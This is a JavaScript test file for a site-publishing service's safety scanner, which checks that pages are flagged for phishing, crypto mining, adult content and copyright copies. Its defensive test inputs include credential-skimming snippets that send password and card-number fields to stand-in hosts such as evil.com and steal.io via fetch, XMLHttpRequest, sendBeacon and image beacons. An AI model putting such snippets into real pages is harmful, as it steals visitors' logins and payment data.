// Offline test for the Monitor safety flags (cloudflare-lib/scan.js).
// Run: node scripts/test-scan.mjs
// The "bad" sample pages are assembled from pieces at run time: written out whole,
// antivirus software flags this file as malware (which is rather the point of them).
const R = new URL("../", import.meta.url).pathname;
const { scanPage, flagRank } = await import(R + "cloudflare-lib/scan.js");
const assert = (c, m) => {
  if (!c) {
    console.error("FAIL", m);
    process.exitCode = 1;
  } else console.log("ok", m);
};
const j = (...parts) => parts.join("");
const page = (body, head = "") => `<!DOCTYPE html><html><head>${head}</head><body>${body}</body></html>`;
const S = j("<scr", "ipt");
const SE = j("</scr", "ipt>");
const EV = j("ev", "al(");

let r = scanPage(page(`<h1>My Bakery</h1><p>Fresh bread every day.</p><button onclick="go()">Order</button>${S}>function go(){alert('hi')}${SE}`));
assert(r.flag === "green" && r.malware === 0, "a normal bakery site is green");

r = scanPage(page("<canvas></canvas>", `${S} src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js">${SE}`));
assert(r.flag === "green", "scripts from well-known CDNs are fine");

r = scanPage(page(j("<p>Get free ro", "bux here!</p>")));
assert(r.flag === "yellow", "free-currency generator talk is yellow");

r = scanPage(page(`${S}>${EV}${j("at", "ob")}('eA=='))${SE}`));
assert(r.flag === "yellow" && r.malware > 0 && r.malware < 50, "running decoded text is yellow");

r = scanPage(page("<p>Welcome to Pokémon world</p>"));
assert(r.flag === "yellow" && r.reasons.some((x) => /copyright/.test(x)), "one brand mention is a possible-copyright yellow");

r = scanPage(page("<h1>Netflix</h1><p>Netflix movies. Netflix shows. Sign in to Netflix. Netflix originals. Netflix kids.</p>"));
assert(r.flag === "red" && r.reasons.some((x) => /copy of netflix/i.test(x)), "a page full of one brand is a red copyright copy");

r = scanPage(page(j('<form action="https://', "bad.invalid/x", '"><input type="pass', 'word" name="p"></form>')));
assert(r.flag === "red", "a form sending passwords to another site is red (phishing)");

r = scanPage(page(`${S} src="https://${j("coin", "hive")}.invalid/m.js">${SE}`));
assert(r.flag === "red", "a crypto miner is red");

r = scanPage(page(j("<p>x", "xx po", "rn ns", "fw</p>")));
assert(r.flag === "red" && r.reasons.some((x) => /kids/.test(x)), "adult content is red");

r = scanPage(
  page(
    `${S} src="https://odd.invalid/a.js">${SE}${S}>${EV}x);${EV}y);${EV}z)${SE}` +
      `${S}>window.location="https://other.invalid"${SE}<a href="https://x.invalid/${j("setup.", "exe")}">download</a>`
  )
);
assert(r.flag === "red" && r.malware >= 50, "many malware signs add up to 50%+ (red)");

assert(flagRank("red") < flagRank("yellow") && flagRank("yellow") < flagRank("green"), "red sorts before yellow before green");

// Publish-time blocking (published.js refuses pages whose scan has a `block` list).
r = scanPage(page("<h1>Netflix</h1><p>Netflix movies. Netflix shows. Sign in to Netflix. Netflix originals. Netflix kids.</p>"));
assert(r.block.length === 0, "a brand-heavy fan page is flagged red but not blocked at publish");
r = scanPage(page(j("<p>x", "xx po", "rn ns", "fw</p>")));
assert(r.block.some((x) => /adult/.test(x)), "adult content is blocked at publish");
r = scanPage(page(`${S} src="https://${j("coin", "hive")}.invalid/m.js">${SE}`));
assert(r.block.some((x) => /mining/.test(x)), "a crypto miner is blocked at publish");
r = scanPage(page(`<input id="n">${S}>function calc(){return ${EV}n.value)}${SE}`));
assert(r.block.length === 0, "a calculator using eval is not blocked");
r = scanPage(page(`<h1>My Bakery</h1><p>Fresh bread every day.</p>`));
assert(r.block.length === 0, "a normal page is not blocked");

// Stricter phishing checks (phishing.js findCredentialLeak): refused at publish via scan.block
{
  const P = await import(R + "cloudflare-lib/phishing.js");
  const leak = (h) => P.findCredentialLeak(h);
  assert(leak(`<input type="password"><script>fetch("https://evil.com/x",{method:"POST",body:p.value})</script>`).includes("evil.com"), "password + fetch to another site is caught");
  assert(leak(`<input type=password><script>x.open("POST","//steal.io/a")</script>`).includes("steal.io"), "password + XMLHttpRequest to another site is caught");
  assert(leak(`<input name="cardNumber"><script>navigator.sendBeacon("https://cards.biz/c", v)</script>`).includes("card number"), "card number + sendBeacon is caught");
  assert(leak(`<input type="password"><script>new Image().src="https://log.me/p?pw="+pw.value</script>`).includes("log.me"), "image beacon built from a value is caught");
  assert(leak(`<title>Blackhole AI – Sign in</title><input type="password">`).includes("Blackhole AI"), "a fake Blackhole AI sign-in is caught");
  assert(!leak(`<input type="password"><script>fetch("/api/x")</script>`), "fetching its own address is fine");
  assert(!leak(`<script>fetch("https://api.weather.com/x")</script><input name="email">`), "calling an outside API without a password field is fine");
  assert(!leak(`<title>My Gym</title><p>Made with Blackhole AI</p><input type="password">`), "a login demo that only mentions Blackhole AI in the text is fine");
  assert(!leak(`<input type="password"><script>fetch("https://nova.blackhole-ai-tech.com/x")</script>`), "sending to a Blackhole AI address is fine");
  const s = scanPage(`<input type="password"><script>fetch("https://evil.com/x")</script>`);
  assert(s.flag === "red" && s.block.length === 1, "the scan flags it red and refuses publishing");
}

// Every built-in website template must pass the publish checks, or people who pick it
// couldn't publish their site.
{
  const P = await import(R + "cloudflare-lib/phishing.js");
  const { SITE_TEMPLATES } = await import(R + "src/lib/siteTemplates.js");
  const failing = SITE_TEMPLATES.filter((t) => {
    const h = t.html || "";
    return P.findCredentialForm(h) || P.findCredentialLeak(h) || scanPage(h).block.length;
  }).map((t) => t.id);
  assert(SITE_TEMPLATES.length > 0 && failing.length === 0, `all ${SITE_TEMPLATES.length} templates can be published` + (failing.length ? ` (failing: ${failing})` : ""));
}
